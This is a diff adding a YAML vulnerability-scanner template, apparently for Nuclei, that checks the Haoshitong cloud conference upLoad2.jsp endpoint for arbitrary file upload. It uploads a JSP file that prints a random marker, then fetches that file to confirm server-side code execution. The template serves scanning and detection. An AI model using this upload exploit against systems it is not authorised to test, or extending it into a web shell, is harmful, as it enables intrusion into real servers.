@@ -1,0 +1,56 @@
+id: poc-yaml-hst-yunhuiyi-upload2jsp-anyfile-upload
+info:
+  name: "好视通云会议 upLoad2.jsp 任意文件上传漏洞"
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  metadata:
+    product: "好视通云会议"
+
+variables:
+  filename: "{{rand_base(6)}}"
+  content: "{{rand_base(32)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/fm/systemConfig/upLoad2.jsp"
+    headers:
+      Content-Type: "multipart/form-data; boundary=1515df1sdfdsfddfs"
+    body: |
+      --1515df1sdfdsfddfs
+      Content-Disposition: form-data; name="file"; filename="{{filename}}.jsp"
+      Content-Type: application/octet-stream
+      
+      <%@ page contentType="text/plain" %>
+      <%
+          out.print("{{content}}");
+      %>
+      --1515df1sdfdsfddfs--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "text/html"
+
+  - id: verify-upload
+    method: POST
+    path:
+      - "{{BaseURL}}/fm/upload/{{filename}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{content}}"
